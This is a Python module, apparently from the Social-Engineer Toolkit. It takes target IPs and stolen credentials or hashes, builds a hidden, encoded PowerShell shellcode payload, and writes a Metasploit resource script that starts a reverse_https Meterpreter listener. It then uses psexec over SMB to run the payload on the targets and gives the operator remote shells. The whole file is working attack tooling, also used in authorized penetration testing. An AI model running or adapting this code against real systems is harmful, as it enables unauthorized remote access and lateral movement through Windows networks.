# coding=utf-8
#############################################
#
# Main SET module for psexec
#
#############################################
import os
import subprocess

import src.core.setcore as core
from src.payloads.powershell.prep import  prep_powershell_payload

# Py2/3 compatibility
# Python3 renamed raw_input to input
try:
    input = raw_input
except NameError:
    pass

# Module options (auxiliary/admin/smb/psexec_command):

#   Name       Current Setting                    Required  Description
#   ----       ---------------                    --------  -----------
#   COMMAND    net group "Domain Admins" /domain  yes       The command you want to execute on the remote host
#   RHOSTS                                        yes       The target address range or CIDR identifier
#   RPORT      445                                yes       The Target port
#   SMBDomain  WORKGROUP                          no        The Windows domain to use for authentication
#   SMBPass                                       no        The password for the specified username
#   SMBSHARE   C$                                 yes       The name of a writeable share on the server
#   SMBUser                                       no        The username to authenticate as
#   THREADS    1                                  yes       The number of concurrent threads
#   WINPATH    WINDOWS                            yes       The name of the remote Windows directory

# msf auxiliary(psexec_command) >

# grab config options for stage encoding
stage_encoding = core.check_config("STAGE_ENCODING=").lower()
if stage_encoding == "off":
    stage_encoding = "false"
else:
    stage_encoding = "true"

rhosts = input(core.setprompt(["32"], "Enter the IP Address or range (RHOSTS) to connect to"))  # rhosts
# username for domain/workgroup
username = input(core.setprompt(["32"], "Enter the username"))
# password for domain/workgroup
password = input(core.setprompt(["32"], "Enter the password or the hash"))
domain = input(core.setprompt(["32"], "Enter the domain name (hit enter for logon locally)"))  # domain name
threads = input(core.setprompt(["32"], "How many threads do you want [enter for default]"))
# if blank specify workgroup which is the default
if domain == "":
    domain = "WORKGROUP"
# set the threads
if threads == "":
    threads = "15"

payload = core.check_config("POWERSHELL_INJECT_PAYLOAD_X86=").lower()

#
# payload generation for powershell injection
#

try:

    # specify ipaddress of reverse listener
    ipaddr = core.grab_ipaddress()
    core.update_options("IPADDR=" + ipaddr)
    port = input(core.setprompt(["29"], "Enter the port for the reverse [443]"))
    if port == "":
        port = "443"
    core.update_options("PORT={0}".format(port))
    with open(os.path.join(core.setdir + "/payload_options.shellcode"), "w") as filewrite:
        # format needed for shellcode generation
        filewrite.write("{0} {1},".format(payload, port))
    core.update_options("POWERSHELL_SOLO=ON")
    core.print_status("Prepping the payload for delivery and injecting alphanumeric shellcode...")

    prep_powershell_payload()

    # create the directory if it does not exist
    if not os.path.isdir(os.path.join(core.setdir + "reports/powershell")):
        os.makedirs(os.path.join(core.setdir + "reports/powershell"))

    with open(os.path.join(core.setdir + "x86.powershell")) as fileopen:
        x86 = fileopen.read()
    x86 = "powershell -nop -window hidden -noni -EncodedCommand {0}".format(x86)
    core.print_status("If you want the powershell commands and attack, they are exported to {0}".format(os.path.join(core.setdir + "reports/powershell")))
    with open(os.path.join(core.setdir + "/reports/powershell/x86_powershell_injection.txt", "w")) as filewrite:
        filewrite.write(x86)
    payload = "windows/meterpreter/reverse_https\n"  # if we are using x86
    command = x86  # assign powershell to command

    # write out our answer file for the powershell injection attack
    with open(core.setdir + "/reports/powershell/powershell.rc", "w") as filewrite:
        filewrite.write("use multi/handler\n"
                        "set payload windows/meterpreter/reverse_https\n"
                        "set LPORT {0}\n"
                        "set LHOST 0.0.0.0\n"
                        "set ExitOnSession false\n"
                        "exploit -j\n"
                        "use auxiliary/admin/smb/psexec_command\n"
                        "set RHOSTS {1}\n"
                        "set SMBUser {2}\n"
                        "set SMBPass {3}\n"
                        "set SMBDomain {4}\n"
                        "set THREADS {5}\n"
                        "set COMMAND {6}\n"
                        "set EnableStageEncoding {7}\n"
                        "set ExitOnSession false\n"
                        "exploit\n".format(port, rhosts, username, password, domain, threads, command, stage_encoding))

    # launch metasploit below
    core.print_status("Launching Metasploit.. This may take a few seconds.")
    subprocess.Popen("{0} -r {1}".format(os.path.join(core.meta_path() + "msfconsole"),
                                         os.path.join(core.setdir + "reports/powershell/powershell.rc")),
                     shell=True).wait()

# handle exceptions
except Exception as e:
    core.print_error("Something went wrong printing error: {0}".format(e))
